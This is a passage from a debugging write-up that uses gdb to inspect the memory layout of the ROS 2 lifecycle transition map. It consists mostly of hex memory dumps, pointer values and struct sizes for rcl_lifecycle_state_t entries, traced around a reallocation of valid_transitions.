    <p>Let’s figure out the size of the structures within transition_map, in particular, states:</p>
    <div class="sourceCode" id="cb132"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb132-1"><a href="#cb132-1" aria-hidden="true" tabindex="-1"></a><span class="kw">(</span><span class="fu">gdb</span><span class="kw">)</span> <span class="ex">p</span> sizeof<span class="er">(</span><span class="ex">rcl_lifecycle_transition_map_t</span><span class="kw">)</span></span>
    <span id="cb132-2"><a href="#cb132-2" aria-hidden="true" tabindex="-1"></a><span class="va">$1</span> = 32</span>
    <span id="cb132-3"><a href="#cb132-3" aria-hidden="true" tabindex="-1"></a><span class="kw">(</span><span class="fu">gdb</span><span class="kw">)</span> <span class="ex">x/32b</span> 0x613000001548</span>
    <span id="cb132-4"><a href="#cb132-4" aria-hidden="true" tabindex="-1"></a><span class="ex">0x613000001548:</span> 0x00    0x17    0x00    0x00    0x30    0x61    0x00    0x00</span>
    <span id="cb132-5"><a href="#cb132-5" aria-hidden="true" tabindex="-1"></a><span class="ex">0x613000001550:</span> 0x0b    0x00    0x00    0x00    0x00    0x00    0x00    0x00</span>
    <span id="cb132-6"><a href="#cb132-6" aria-hidden="true" tabindex="-1"></a><span class="ex">0x613000001558:</span> 0x00    0x4a    0x00    0x00    0x70    0x61    0x00    0x00</span>
    <span id="cb132-7"><a href="#cb132-7" aria-hidden="true" tabindex="-1"></a><span class="ex">0x613000001560:</span> 0x18    0x00    0x00    0x00    0x00    0x00    0x00    0x00</span></code></pre></div>
    <p>This matches perfectly fine the content above, let’s now read through the memory of the <code>transition_map-&gt;states</code>:</p>
    <div class="sourceCode" id="cb133"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb133-1"><a href="#cb133-1" aria-hidden="true" tabindex="-1"></a><span class="ex">states</span> = {rcl_lifecycle_state_t <span class="pp">*</span> <span class="kw">|</span> <span class="ex">0x613000001700}</span> 0x613000001700</span>
    <span id="cb133-2"><a href="#cb133-2" aria-hidden="true" tabindex="-1"></a>   <span class="ex">label</span> = {const char <span class="pp">*</span> <span class="kw">|</span> <span class="ex">0x7f102f99c8e0}</span> <span class="st">&quot;unknown&quot;</span></span>
    <span id="cb133-3"><a href="#cb133-3" aria-hidden="true" tabindex="-1"></a>   <span class="fu">id</span> = {unsigned int} 0</span>
    <span id="cb133-4"><a href="#cb133-4" aria-hidden="true" tabindex="-1"></a>   <span class="ex">valid_transitions</span> = {rcl_lifecycle_transition_t <span class="pp">*</span> <span class="kw">|</span> <span class="ex">0x0}</span> NULL</span>
    <span id="cb133-5"><a href="#cb133-5" aria-hidden="true" tabindex="-1"></a>   <span class="ex">valid_transition_size</span> = {unsigned int} 0</span>
    <span id="cb133-6"><a href="#cb133-6" aria-hidden="true" tabindex="-1"></a>   </span>
    <span id="cb133-7"><a href="#cb133-7" aria-hidden="true" tabindex="-1"></a><span class="kw">(</span><span class="fu">gdb</span><span class="kw">)</span> <span class="ex">p</span> sizeof<span class="er">(</span><span class="ex">rcl_lifecycle_state_t</span><span class="kw">)</span></span>
    <span id="cb133-8"><a href="#cb133-8" aria-hidden="true" tabindex="-1"></a><span class="va">$2</span> = 32</span>
    <span id="cb133-9"><a href="#cb133-9" aria-hidden="true" tabindex="-1"></a><span class="kw">(</span><span class="fu">gdb</span><span class="kw">)</span> <span class="ex">p</span> sizeof<span class="er">(</span><span class="ex">rcl_lifecycle_state_t</span><span class="kw">)</span><span class="ex">*transition_map-</span><span class="op">&gt;</span>states_size</span>
    <span id="cb133-10"><a href="#cb133-10" aria-hidden="true" tabindex="-1"></a><span class="va">$3</span> = 352</span>
    <span id="cb133-11"><a href="#cb133-11" aria-hidden="true" tabindex="-1"></a><span class="kw">(</span><span class="fu">gdb</span><span class="kw">)</span> <span class="ex">x/352x</span> transition_map-<span class="op">&gt;</span>states</span>
    <span id="cb133-12"><a href="#cb133-12" aria-hidden="true" tabindex="-1"></a><span class="ex">0x613000001700:</span> 0xe0    0xc8    0x99    0x2f    0x10    0x7f    0x00    0x00</span>
    <span id="cb133-13"><a href="#cb133-13" aria-hidden="true" tabindex="-1"></a><span class="ex">0x613000001708:</span> 0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00</span>
    <span id="cb133-14"><a href="#cb133-14" aria-hidden="true" tabindex="-1"></a><span class="ex">0x613000001710:</span> 0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00</span>
    <span id="cb133-15"><a href="#cb133-15" aria-hidden="true" tabindex="-1"></a><span class="ex">0x613000001718:</span> 0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00</span>
    <span id="cb133-16"><a href="#cb133-16" aria-hidden="true" tabindex="-1"></a><span class="ex">0x613000001720:</span> 0x20    0xc9    0x99    0x2f    0x10    0x7f    0x00    0x00</span>
    <span id="cb133-17"><a href="#cb133-17" aria-hidden="true" tabindex="-1"></a><span class="ex">0x613000001728:</span> 0x01    0x00    0x00    0x00    0x00    0x00    0x00    0x00</span>
    <span id="cb133-18"><a href="#cb133-18" aria-hidden="true" tabindex="-1"></a><span class="ex">0x613000001730:</span> 0x00    0x6d    0x04    0x00    0x60    0x60    0x00    0x00</span>
    <span id="cb133-19"><a href="#cb133-19" aria-hidden="true" tabindex="-1"></a><span class="ex">0x613000001738:</span> 0x02    0x00    0x00    0x00    0x00    0x00    0x00    0x00</span>
    <span id="cb133-20"><a href="#cb133-20" aria-hidden="true" tabindex="-1"></a><span class="ex">0x613000001740:</span> 0x60    0xc9    0x99    0x2f    0x10    0x7f    0x00    0x00</span>
    <span id="cb133-21"><a href="#cb133-21" aria-hidden="true" tabindex="-1"></a><span class="ex">0x613000001748:</span> 0x02    0x00    0x00    0x00    0x00    0x00    0x00    0x00</span>
    <span id="cb133-22"><a href="#cb133-22" aria-hidden="true" tabindex="-1"></a><span class="ex">0x613000001750:</span> 0xa0    0xf6    0x02    0x00    0x80    0x60    0x00    0x00</span>
    <span id="cb133-23"><a href="#cb133-23" aria-hidden="true" tabindex="-1"></a><span class="ex">0x613000001758:</span> 0x03    0x00    0x00    0x00    0x00    0x00    0x00    0x00</span>
    <span id="cb133-24"><a href="#cb133-24" aria-hidden="true" tabindex="-1"></a><span class="ex">0x613000001760:</span> 0xa0    0xc9    0x99    0x2f    0x10    0x7f    0x00    0x00</span>
    <span id="cb133-25"><a href="#cb133-25" aria-hidden="true" tabindex="-1"></a><span class="ex">0x613000001768:</span> 0x03    0x00    0x00    0x00    0x00    0x00    0x00    0x00</span>
    <span id="cb133-26"><a href="#cb133-26" aria-hidden="true" tabindex="-1"></a><span class="ex">0x613000001770:</span> 0x60    0x6d    0x04    0x00    0x60    0x60    0x00    0x00</span>
    <span id="cb133-27"><a href="#cb133-27" aria-hidden="true" tabindex="-1"></a><span class="ex">0x613000001778:</span> 0x02    0x00    0x00    0x00    0x00    0x00    0x00    0x00</span>
    <span id="cb133-28"><a href="#cb133-28" aria-hidden="true" tabindex="-1"></a><span class="ex">0x613000001780:</span> 0xe0    0xc9    0x99    0x2f    0x10    0x7f    0x00    0x00</span>
    <span id="cb133-29"><a href="#cb133-29" aria-hidden="true" tabindex="-1"></a><span class="ex">0x613000001788:</span> 0x04    0x00    0x00    0x00    0x00    0x00    0x00    0x00</span>
    <span id="cb133-30"><a href="#cb133-30" aria-hidden="true" tabindex="-1"></a><span class="ex">0x613000001790:</span> 0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00</span>
    <span id="cb133-31"><a href="#cb133-31" aria-hidden="true" tabindex="-1"></a><span class="ex">0x613000001798:</span> 0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00</span>
    <span id="cb133-32"><a href="#cb133-32" aria-hidden="true" tabindex="-1"></a><span class="ex">0x6130000017a0:</span> 0x00    0xcb    0x99    0x2f    0x10    0x7f    0x00    0x00</span>
    <span id="cb133-33"><a href="#cb133-33" aria-hidden="true" tabindex="-1"></a><span class="ex">0x6130000017a8:</span> 0x0a    0x00    0x00    0x00    0x30    0x61    0x00    0x00</span>
    <span id="cb133-34"><a href="#cb133-34" aria-hidden="true" tabindex="-1"></a><span class="ex">0x6130000017b0:</span> 0xa0    0xf4    0x02    0x00    0x80    0x60    0x00    0x00</span>
    <span id="cb133-35"><a href="#cb133-35" aria-hidden="true" tabindex="-1"></a><span class="ex">0x6130000017b8:</span> 0x03    0x00    0x00    0x00    0x00    0x00    0x00    0x00</span>
    <span id="cb133-36"><a href="#cb133-36" aria-hidden="true" tabindex="-1"></a><span class="ex">0x6130000017c0:</span> 0x40    0xcb    0x99    0x2f    0x10    0x7f    0x00    0x00</span>
    <span id="cb133-37"><a href="#cb133-37" aria-hidden="true" tabindex="-1"></a><span class="ex">0x6130000017c8:</span> 0x0b    0x00    0x00    0x00    0x00    0x00    0x00    0x00</span>
    <span id="cb133-38"><a href="#cb133-38" aria-hidden="true" tabindex="-1"></a><span class="ex">0x6130000017d0:</span> 0x20    0xf5    0x02    0x00    0x80    0x60    0x00    0x00</span>
    <span id="cb133-39"><a href="#cb133-39" aria-hidden="true" tabindex="-1"></a><span class="ex">0x6130000017d8:</span> 0x03    0x00    0x00    0x00    0x00    0x00    0x00    0x00</span>
    <span id="cb133-40"><a href="#cb133-40" aria-hidden="true" tabindex="-1"></a><span class="ex">0x6130000017e0:</span> 0x80    0xcb    0x99    0x2f    0x10    0x7f    0x00    0x00</span>
    <span id="cb133-41"><a href="#cb133-41" aria-hidden="true" tabindex="-1"></a><span class="ex">0x6130000017e8:</span> 0x0c    0x00    0x00    0x00    0x00    0x00    0x00    0x00</span>
    <span id="cb133-42"><a href="#cb133-42" aria-hidden="true" tabindex="-1"></a><span class="ex">0x6130000017f0:</span> 0x20    0xf7    0x02    0x00    0x80    0x60    0x00    0x00</span>
    <span id="cb133-43"><a href="#cb133-43" aria-hidden="true" tabindex="-1"></a><span class="ex">0x6130000017f8:</span> 0x03    0x00    0x00    0x00    0x00    0x00    0x00    0x00</span>
    <span id="cb133-44"><a href="#cb133-44" aria-hidden="true" tabindex="-1"></a><span class="ex">0x613000001800:</span> 0xc0    0xcb    0x99    0x2f    0x10    0x7f    0x00    0x00</span>
    <span id="cb133-45"><a href="#cb133-45" aria-hidden="true" tabindex="-1"></a><span class="ex">0x613000001808:</span> 0x0d    0x00    0x00    0x00    0x00    0x00    0x00    0x00</span>
    <span id="cb133-46"><a href="#cb133-46" aria-hidden="true" tabindex="-1"></a><span class="ex">0x613000001810:</span> 0xa0    0xf5    0x02    0x00    0x80    0x60    0x00    0x00</span>
    <span id="cb133-47"><a href="#cb133-47" aria-hidden="true" tabindex="-1"></a><span class="ex">0x613000001818:</span> 0x03    0x00    0x00    0x00    0x00    0x00    0x00    0x00</span>
    <span id="cb133-48"><a href="#cb133-48" aria-hidden="true" tabindex="-1"></a><span class="ex">0x613000001820:</span> 0x00    0xcc    0x99    0x2f    0x10    0x7f    0x00    0x00</span>
    <span id="cb133-49"><a href="#cb133-49" aria-hidden="true" tabindex="-1"></a><span class="ex">0x613000001828:</span> 0x0e    0x00    0x00    0x00    0x00    0x00    0x00    0x00</span>
    <span id="cb133-50"><a href="#cb133-50" aria-hidden="true" tabindex="-1"></a><span class="ex">0x613000001830:</span> 0x20    0xf6    0x02    0x00    0x80    0x60    0x00    0x00</span>
    <span id="cb133-51"><a href="#cb133-51" aria-hidden="true" tabindex="-1"></a><span class="ex">0x613000001838:</span> 0x03    0x00    0x00    0x00    0x00    0x00    0x00    0x00</span>
    <span id="cb133-52"><a href="#cb133-52" aria-hidden="true" tabindex="-1"></a><span class="ex">0x613000001840:</span> 0x40    0xcc    0x99    0x2f    0x10    0x7f    0x00    0x00</span>
    <span id="cb133-53"><a href="#cb133-53" aria-hidden="true" tabindex="-1"></a><span class="ex">0x613000001848:</span> 0x0f    0x00    0x00    0x00    0x00    0x00    0x00    0x00</span>
    <span id="cb133-54"><a href="#cb133-54" aria-hidden="true" tabindex="-1"></a><span class="ex">0x613000001850:</span> 0xa0    0xfd    0x05    0x00    0x30    0x60    0x00    0x00</span>
    <span id="cb133-55"><a href="#cb133-55" aria-hidden="true" tabindex="-1"></a><span class="ex">0x613000001858:</span> 0x02    0x00    0x00    0x00    0x00    0x00    0x00    0x00</span></code></pre></div>
    <p>or its shorter version:</p>
    <div class="sourceCode" id="cb134"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb134-1"><a href="#cb134-1" aria-hidden="true" tabindex="-1"></a><span class="kw">(</span><span class="fu">gdb</span><span class="kw">)</span> <span class="ex">p</span> sizeof<span class="er">(</span><span class="ex">rcl_lifecycle_state_t</span><span class="kw">)</span><span class="ex">*transition_map-</span><span class="op">&gt;</span>states_size/4</span>
    <span id="cb134-2"><a href="#cb134-2" aria-hidden="true" tabindex="-1"></a><span class="va">$4</span> = 88</span>
    <span id="cb134-3"><a href="#cb134-3" aria-hidden="true" tabindex="-1"></a><span class="kw">(</span><span class="fu">gdb</span><span class="kw">)</span> <span class="ex">x/88w</span> transition_map-<span class="op">&gt;</span>states</span>
    <span id="cb134-4"><a href="#cb134-4" aria-hidden="true" tabindex="-1"></a><span class="ex">0x613000001700:</span> 0x2f99c8e0  0x00007f10  0x00000000  0x00000000</span>
    <span id="cb134-5"><a href="#cb134-5" aria-hidden="true" tabindex="-1"></a><span class="ex">0x613000001710:</span> 0x00000000  0x00000000  0x00000000  0x00000000</span>
    <span id="cb134-6"><a href="#cb134-6" aria-hidden="true" tabindex="-1"></a><span class="ex">0x613000001720:</span> 0x2f99c920  0x00007f10  0x00000001  0x00000000</span>
    <span id="cb134-7"><a href="#cb134-7" aria-hidden="true" tabindex="-1"></a><span class="ex">0x613000001730:</span> 0x00046d00  0x00006060  0x00000002  0x00000000</span>
    <span id="cb134-8"><a href="#cb134-8" aria-hidden="true" tabindex="-1"></a><span class="ex">0x613000001740:</span> 0x2f99c960  0x00007f10  0x00000002  0x00000000</span>
    <span id="cb134-9"><a href="#cb134-9" aria-hidden="true" tabindex="-1"></a><span class="ex">0x613000001750:</span> 0x0002f6a0  0x00006080  0x00000003  0x00000000</span>
    <span id="cb134-10"><a href="#cb134-10" aria-hidden="true" tabindex="-1"></a><span class="ex">0x613000001760:</span> 0x2f99c9a0  0x00007f10  0x00000003  0x00000000</span>
    <span id="cb134-11"><a href="#cb134-11" aria-hidden="true" tabindex="-1"></a><span class="ex">0x613000001770:</span> 0x00046d60  0x00006060  0x00000002  0x00000000</span>
    <span id="cb134-12"><a href="#cb134-12" aria-hidden="true" tabindex="-1"></a><span class="ex">0x613000001780:</span> 0x2f99c9e0  0x00007f10  0x00000004  0x00000000</span>
    <span id="cb134-13"><a href="#cb134-13" aria-hidden="true" tabindex="-1"></a><span class="ex">0x613000001790:</span> 0x00000000  0x00000000  0x00000000  0x00000000</span>
    <span id="cb134-14"><a href="#cb134-14" aria-hidden="true" tabindex="-1"></a><span class="ex">0x6130000017a0:</span> 0x2f99cb00  0x00007f10  0x0000000a  0x00006130</span>
    <span id="cb134-15"><a href="#cb134-15" aria-hidden="true" tabindex="-1"></a><span class="ex">0x6130000017b0:</span> 0x0002f4a0  0x00006080  0x00000003  0x00000000</span>
    <span id="cb134-16"><a href="#cb134-16" aria-hidden="true" tabindex="-1"></a><span class="ex">0x6130000017c0:</span> 0x2f99cb40  0x00007f10  0x0000000b  0x00000000</span>
    <span id="cb134-17"><a href="#cb134-17" aria-hidden="true" tabindex="-1"></a><span class="ex">0x6130000017d0:</span> 0x0002f520  0x00006080  0x00000003  0x00000000</span>
    <span id="cb134-18"><a href="#cb134-18" aria-hidden="true" tabindex="-1"></a><span class="ex">0x6130000017e0:</span> 0x2f99cb80  0x00007f10  0x0000000c  0x00000000</span>
    <span id="cb134-19"><a href="#cb134-19" aria-hidden="true" tabindex="-1"></a><span class="ex">0x6130000017f0:</span> 0x0002f720  0x00006080  0x00000003  0x00000000</span>
    <span id="cb134-20"><a href="#cb134-20" aria-hidden="true" tabindex="-1"></a><span class="ex">0x613000001800:</span> 0x2f99cbc0  0x00007f10  0x0000000d  0x00000000</span>
    <span id="cb134-21"><a href="#cb134-21" aria-hidden="true" tabindex="-1"></a><span class="ex">0x613000001810:</span> 0x0002f5a0  0x00006080  0x00000003  0x00000000</span>
    <span id="cb134-22"><a href="#cb134-22" aria-hidden="true" tabindex="-1"></a><span class="ex">0x613000001820:</span> 0x2f99cc00  0x00007f10  0x0000000e  0x00000000</span>
    <span id="cb134-23"><a href="#cb134-23" aria-hidden="true" tabindex="-1"></a><span class="ex">0x613000001830:</span> 0x0002f620  0x00006080  0x00000003  0x00000000</span>
    <span id="cb134-24"><a href="#cb134-24" aria-hidden="true" tabindex="-1"></a><span class="ex">0x613000001840:</span> 0x2f99cc40  0x00007f10  0x0000000f  0x00000000</span>
    <span id="cb134-25"><a href="#cb134-25" aria-hidden="true" tabindex="-1"></a><span class="ex">0x613000001850:</span> 0x0005fda0  0x00006030  0x00000002  0x00000000</span></code></pre></div>
    <p>Actually, the memory above can be decomposed as follows using the variables information:</p>
    <div class="sourceCode" id="cb135"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb135-1"><a href="#cb135-1" aria-hidden="true" tabindex="-1"></a><span class="ex">transition_map</span> = {rcl_lifecycle_transition_map_t <span class="pp">*</span> <span class="kw">|</span> <span class="ex">0x613000001548}</span> 0x613000001548</span>
    <span id="cb135-2"><a href="#cb135-2" aria-hidden="true" tabindex="-1"></a> <span class="ex">states</span> = {rcl_lifecycle_state_t <span class="pp">*</span> <span class="kw">|</span> <span class="ex">0x613000001700}</span> 0x613000001700</span>
    <span id="cb135-3"><a href="#cb135-3" aria-hidden="true" tabindex="-1"></a>   <span class="ex">label</span> = {const char <span class="pp">*</span> <span class="kw">|</span> <span class="ex">0x7f102f99c8e0}</span> <span class="st">&quot;unknown&quot;</span></span>
    <span id="cb135-4"><a href="#cb135-4" aria-hidden="true" tabindex="-1"></a>   <span class="fu">id</span> = {unsigned int} 0</span>
    <span id="cb135-5"><a href="#cb135-5" aria-hidden="true" tabindex="-1"></a>   <span class="ex">valid_transitions</span> = {rcl_lifecycle_transition_t <span class="pp">*</span> <span class="kw">|</span> <span class="ex">0x0}</span> NULL</span>
    <span id="cb135-6"><a href="#cb135-6" aria-hidden="true" tabindex="-1"></a>   <span class="ex">valid_transition_size</span> = {unsigned int} 0</span>
    <span id="cb135-7"><a href="#cb135-7" aria-hidden="true" tabindex="-1"></a> </span>
    <span id="cb135-8"><a href="#cb135-8" aria-hidden="true" tabindex="-1"></a>              <span class="ex">transition_map-</span><span class="op">&gt;</span>states-<span class="op">&gt;</span>label    transition_map-<span class="op">&gt;</span>states-<span class="op">&gt;</span>id</span>
    <span id="cb135-9"><a href="#cb135-9" aria-hidden="true" tabindex="-1"></a> <span class="ex">0x613000001700:</span>    [0x2f99c8e0 0x00007f10] [0x00000000 0x00000000]</span>
    <span id="cb135-10"><a href="#cb135-10" aria-hidden="true" tabindex="-1"></a>        <span class="ex">transition_map-</span><span class="op">&gt;</span>states-<span class="op">&gt;</span>valid_transitions  transition_map-<span class="op">&gt;</span>states-<span class="op">&gt;</span>valid_transitions_size</span>
    <span id="cb135-11"><a href="#cb135-11" aria-hidden="true" tabindex="-1"></a> <span class="ex">0x613000001710:</span>    [0x00000000 0x00000000] [0x00000000 0x00000000]</span>
    <span id="cb135-12"><a href="#cb135-12" aria-hidden="true" tabindex="-1"></a> <span class="ex">...</span></span></code></pre></div>
    <p>Going back to the example:</p>
    <div class="sourceCode" id="cb136"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb136-1"><a href="#cb136-1" aria-hidden="true" tabindex="-1"></a><span class="ex">state</span> = {rcl_lifecycle_state_t <span class="pp">*</span> <span class="kw">|</span> <span class="ex">0x613000001840}</span> 0x613000001840</span>
    <span id="cb136-2"><a href="#cb136-2" aria-hidden="true" tabindex="-1"></a> <span class="ex">label</span> = {const char <span class="pp">*</span> <span class="kw">|</span> <span class="ex">0x7f102f99cc40}</span> <span class="st">&quot;errorprocessing&quot;</span></span>
    <span id="cb136-3"><a href="#cb136-3" aria-hidden="true" tabindex="-1"></a> <span class="fu">id</span> = {unsigned int} 15</span>
    <span id="cb136-4"><a href="#cb136-4" aria-hidden="true" tabindex="-1"></a> <span class="ex">valid_transitions</span> = {rcl_lifecycle_transition_t <span class="pp">*</span> <span class="kw">|</span> <span class="ex">0x60300005fda0}</span> 0x60300005fda0</span>
    <span id="cb136-5"><a href="#cb136-5" aria-hidden="true" tabindex="-1"></a> <span class="ex">valid_transition_size</span> = {unsigned int} 2</span>
    <span id="cb136-6"><a href="#cb136-6" aria-hidden="true" tabindex="-1"></a> </span>
    <span id="cb136-7"><a href="#cb136-7" aria-hidden="true" tabindex="-1"></a><span class="ex">new_valid_transitions</span> = {rcl_lifecycle_transition_t <span class="pp">*</span> <span class="kw">|</span> <span class="ex">0x606000046e20}</span> 0x606000046e20</span>
    <span id="cb136-8"><a href="#cb136-8" aria-hidden="true" tabindex="-1"></a> <span class="ex">label</span> = {const char <span class="pp">*</span> <span class="kw">|</span> <span class="ex">0x7f102f99c780}</span> <span class="st">&quot;transition_success&quot;</span></span>
    <span id="cb136-9"><a href="#cb136-9" aria-hidden="true" tabindex="-1"></a> <span class="fu">id</span> = {unsigned int} 60</span>
    <span id="cb136-10"><a href="#cb136-10" aria-hidden="true" tabindex="-1"></a> <span class="ex">start</span> = {rcl_lifecycle_state_t <span class="pp">*</span> <span class="kw">|</span> <span class="ex">0x613000001840}</span> 0x613000001840</span>
    <span id="cb136-11"><a href="#cb136-11" aria-hidden="true" tabindex="-1"></a> <span class="ex">goal</span> = {rcl_lifecycle_state_t <span class="pp">*</span> <span class="kw">|</span> <span class="ex">0x613000001720}</span> 0x613000001720</span></code></pre></div>
    <p><code>new_valid_transitions</code> points to <code>0x606000046e20</code> whereas <code>state-&gt;valid_transitions</code> to <code>0x60300005fda0</code> (both should match after the function). Finally, state points to <code>0x613000001840</code>.</p>
    <p>Let’s start by validating that <code>state</code> is indeed within the <code>transition_map</code> states:</p>
    <div class="sourceCode" id="cb137"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb137-1"><a href="#cb137-1" aria-hidden="true" tabindex="-1"></a></span>
    <span id="cb137-2"><a href="#cb137-2" aria-hidden="true" tabindex="-1"></a><span class="ex">p</span> sizeof<span class="er">(</span><span class="ex">rcl_lifecycle_state_t</span><span class="kw">)</span><span class="ex">*transition_map-</span><span class="op">&gt;</span>states_size/8</span>
    <span id="cb137-3"><a href="#cb137-3" aria-hidden="true" tabindex="-1"></a><span class="va">$1</span><span class="ex">5</span> = 44</span>
    <span id="cb137-4"><a href="#cb137-4" aria-hidden="true" tabindex="-1"></a></span>
    <span id="cb137-5"><a href="#cb137-5" aria-hidden="true" tabindex="-1"></a><span class="kw">(</span><span class="fu">gdb</span><span class="kw">)</span> <span class="ex">x/44g</span> transition_map-<span class="op">&gt;</span>states</span>
    <span id="cb137-6"><a href="#cb137-6" aria-hidden="true" tabindex="-1"></a><span class="ex">0x613000001700:</span> 0x00007f102f99c8e0  0x0000000000000000</span>
    <span id="cb137-7"><a href="#cb137-7" aria-hidden="true" tabindex="-1"></a><span class="ex">0x613000001710:</span> 0x0000000000000000  0x0000000000000000</span>
    <span id="cb137-8"><a href="#cb137-8" aria-hidden="true" tabindex="-1"></a><span class="ex">0x613000001720:</span> 0x00007f102f99c920  0x0000000000000001</span>
    <span id="cb137-9"><a href="#cb137-9" aria-hidden="true" tabindex="-1"></a><span class="ex">0x613000001730:</span> 0x0000606000046d00  0x0000000000000002</span>
    <span id="cb137-10"><a href="#cb137-10" aria-hidden="true" tabindex="-1"></a><span class="ex">0x613000001740:</span> 0x00007f102f99c960  0x0000000000000002</span>
    <span id="cb137-11"><a href="#cb137-11" aria-hidden="true" tabindex="-1"></a><span class="ex">0x613000001750:</span> 0x000060800002f6a0  0x0000000000000003</span>
    <span id="cb137-12"><a href="#cb137-12" aria-hidden="true" tabindex="-1"></a><span class="ex">0x613000001760:</span> 0x00007f102f99c9a0  0x0000000000000003</span>
    <span id="cb137-13"><a href="#cb137-13" aria-hidden="true" tabindex="-1"></a><span class="ex">0x613000001770:</span> 0x0000606000046d60  0x0000000000000002</span>
    <span id="cb137-14"><a href="#cb137-14" aria-hidden="true" tabindex="-1"></a><span class="ex">0x613000001780:</span> 0x00007f102f99c9e0  0x0000000000000004</span>
    <span id="cb137-15"><a href="#cb137-15" aria-hidden="true" tabindex="-1"></a><span class="ex">0x613000001790:</span> 0x0000000000000000  0x0000000000000000</span>
    <span id="cb137-16"><a href="#cb137-16" aria-hidden="true" tabindex="-1"></a><span class="ex">0x6130000017a0:</span> 0x00007f102f99cb00  0x000061300000000a</span>
    <span id="cb137-17"><a href="#cb137-17" aria-hidden="true" tabindex="-1"></a><span class="ex">0x6130000017b0:</span> 0x000060800002f4a0  0x0000000000000003</span>
    <span id="cb137-18"><a href="#cb137-18" aria-hidden="true" tabindex="-1"></a><span class="ex">0x6130000017c0:</span> 0x00007f102f99cb40  0x000000000000000b</span>
    <span id="cb137-19"><a href="#cb137-19" aria-hidden="true" tabindex="-1"></a><span class="ex">0x6130000017d0:</span> 0x000060800002f520  0x0000000000000003</span>
    <span id="cb137-20"><a href="#cb137-20" aria-hidden="true" tabindex="-1"></a><span class="ex">0x6130000017e0:</span> 0x00007f102f99cb80  0x000000000000000c</span>
    <span id="cb137-21"><a href="#cb137-21" aria-hidden="true" tabindex="-1"></a><span class="ex">0x6130000017f0:</span> 0x000060800002f720  0x0000000000000003</span>
    <span id="cb137-22"><a href="#cb137-22" aria-hidden="true" tabindex="-1"></a><span class="ex">0x613000001800:</span> 0x00007f102f99cbc0  0x000000000000000d</span>
    <span id="cb137-23"><a href="#cb137-23" aria-hidden="true" tabindex="-1"></a><span class="ex">0x613000001810:</span> 0x000060800002f5a0  0x0000000000000003</span>
    <span id="cb137-24"><a href="#cb137-24" aria-hidden="true" tabindex="-1"></a><span class="ex">0x613000001820:</span> 0x00007f102f99cc00  0x000000000000000e</span>
    <span id="cb137-25"><a href="#cb137-25" aria-hidden="true" tabindex="-1"></a><span class="ex">0x613000001830:</span> 0x000060800002f620  0x0000000000000003</span>
    <span id="cb137-26"><a href="#cb137-26" aria-hidden="true" tabindex="-1"></a><span class="ex">0x613000001840:</span> 0x00007f102f99cc40  0x000000000000000f</span>
    <span id="cb137-27"><a href="#cb137-27" aria-hidden="true" tabindex="-1"></a></span>
    <span id="cb137-28"><a href="#cb137-28" aria-hidden="true" tabindex="-1"></a>      <span class="ex">transition_map-</span><span class="op">&gt;</span>states-<span class="op">&gt;</span>valid_transitions</span>
    <span id="cb137-29"><a href="#cb137-29" aria-hidden="true" tabindex="-1"></a><span class="ex">0x613000001850:</span> [0x000060300005fda0]    0x0000000000000002</span></code></pre></div>
    <p>After line 139 in transition_map.c:</p>
    <div class="sourceCode" id="cb138"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb138-1"><a href="#cb138-1" aria-hidden="true" tabindex="-1"></a><span class="kw">(</span><span class="fu">gdb</span><span class="kw">)</span> <span class="ex">x/44g</span> transition_map-<span class="op">&gt;</span>states</span>
    <span id="cb138-2"><a href="#cb138-2" aria-hidden="true" tabindex="-1"></a><span class="ex">0x613000001700:</span> 0x00007f102f99c8e0  0x0000000000000000</span>
    <span id="cb138-3"><a href="#cb138-3" aria-hidden="true" tabindex="-1"></a><span class="ex">0x613000001710:</span> 0x0000000000000000  0x0000000000000000</span>
    <span id="cb138-4"><a href="#cb138-4" aria-hidden="true" tabindex="-1"></a></span>
    <span id="cb138-5"><a href="#cb138-5" aria-hidden="true" tabindex="-1"></a><span class="ex">0x613000001720:</span> 0x00007f102f99c920  0x0000000000000001</span>
    <span id="cb138-6"><a href="#cb138-6" aria-hidden="true" tabindex="-1"></a><span class="ex">0x613000001730:</span> 0x0000606000046d00  0x0000000000000002</span>
    <span id="cb138-7"><a href="#cb138-7" aria-hidden="true" tabindex="-1"></a></span>
    <span id="cb138-8"><a href="#cb138-8" aria-hidden="true" tabindex="-1"></a><span class="ex">0x613000001740:</span> 0x00007f102f99c960  0x0000000000000002</span>
    <span id="cb138-9"><a href="#cb138-9" aria-hidden="true" tabindex="-1"></a><span class="ex">0x613000001750:</span> 0x000060800002f6a0  0x0000000000000003</span>
    <span id="cb138-10"><a href="#cb138-10" aria-hidden="true" tabindex="-1"></a></span>
    <span id="cb138-11"><a href="#cb138-11" aria-hidden="true" tabindex="-1"></a><span class="ex">0x613000001760:</span> 0x00007f102f99c9a0  0x0000000000000003</span>
    <span id="cb138-12"><a href="#cb138-12" aria-hidden="true" tabindex="-1"></a><span class="ex">0x613000001770:</span> 0x0000606000046d60  0x0000000000000002</span>
    <span id="cb138-13"><a href="#cb138-13" aria-hidden="true" tabindex="-1"></a></span>
    <span id="cb138-14"><a href="#cb138-14" aria-hidden="true" tabindex="-1"></a><span class="ex">0x613000001780:</span> 0x00007f102f99c9e0  0x0000000000000004</span>
    <span id="cb138-15"><a href="#cb138-15" aria-hidden="true" tabindex="-1"></a><span class="ex">0x613000001790:</span> 0x0000000000000000  0x0000000000000000</span>
    <span id="cb138-16"><a href="#cb138-16" aria-hidden="true" tabindex="-1"></a></span>
    <span id="cb138-17"><a href="#cb138-17" aria-hidden="true" tabindex="-1"></a><span class="ex">0x6130000017a0:</span> 0x00007f102f99cb00  0x000061300000000a</span>
    <span id="cb138-18"><a href="#cb138-18" aria-hidden="true" tabindex="-1"></a><span class="ex">0x6130000017b0:</span> 0x000060800002f4a0  0x0000000000000003</span>
    <span id="cb138-19"><a href="#cb138-19" aria-hidden="true" tabindex="-1"></a></span>
